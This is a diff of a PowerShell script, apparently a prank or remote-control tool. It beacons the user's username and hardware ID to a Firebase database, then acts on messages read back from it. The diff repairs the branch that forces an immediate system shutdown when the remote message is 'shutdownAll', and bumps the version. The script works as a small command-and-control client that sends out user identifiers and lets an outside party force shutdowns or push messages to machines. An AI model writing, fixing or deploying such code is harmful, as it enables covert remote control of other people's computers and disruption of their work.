@@ -17,7 +17,7 @@ message = ""
 Invoke-RestMethod -Uri "https://trolo-1252e-default-rtdb.firebaseio.com/main.json" -Method Patch -Body $body
 } elseif (-not $response.$hwid.message -or $response.$hwid.message -eq "") {
 } else {
-if ($respone.$hwid.message -eq "shutdownAll") {
+if ($response.$hwid.message -eq "shutdownAll") {
 shutdown.exe /s /t 0 /f
 } else {
 $topForm = New-Object System.Windows.Forms.Form
@@ -28,7 +28,7 @@ $topForm.WindowState = 'Minimized'
 [System.Windows.Forms.MessageBox]::Show(
     $topForm,
     $response.$hwid.message,
-    "v2.1",
+    "v2.2",
     [System.Windows.Forms.MessageBoxButtons]::OK,
     [System.Windows.Forms.MessageBoxIcon]::Information
 )
@@ -48,10 +48,10 @@ Write-Output "Exception caught: $_"
 $body = @{
 username = $username
 ping = ((Get-Date).ToString("o"))
-message = ""
 } | ConvertTo-Json -Depth 3
 Invoke-RestMethod -Uri "https://trolo-1252e-default-rtdb.firebaseio.com/main/$hwid.json" -Method Patch -Body $body -ContentType "application/json"
 Start-Sleep -Seconds 1
 }
+
 
 
